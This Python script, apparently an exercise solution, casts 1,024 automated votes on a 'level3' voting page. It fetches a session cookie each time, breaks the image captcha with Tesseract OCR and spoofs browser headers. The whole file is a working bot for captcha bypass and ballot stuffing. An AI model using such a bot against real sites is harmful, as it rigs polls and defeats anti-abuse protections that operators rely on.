#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
Created on Thu May 28 07:10:33 2020

@author: meco
"""
import requests
import pytesseract as tess
from io import BytesIO


try:
    import Image
except ImportError:
    from PIL import Image

url = 'http://158.69.76.135'
header = {'Referer': url + '/level3.php',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
                        AppleWebKit/537.36 (KHTML, like Gecko)\
                        Chrome/55.0.2883.87\
                        Safari/537.36'}

cookies = {'HoldTheDoor': '0'}

for i in range(1024):
    req = requests.get(url + '/level3.php')
    cookies['holdthedoor'] = req.cookies['HoldTheDoor']
    captcha = requests.get(url + '/captcha.php')
    content = captcha.content
    img = Image.open(BytesIO(content))
    text = tess.image_to_string(img)
    playload = {'id': '1574', 'holdthedoor': 'submit', 'key': '0',
                'captcha': text}
    req = requests.post(url + '/level3.php', data=playload, cookies=cookies,
                        headers=header)

print('Well done, Voting complete for level 4')
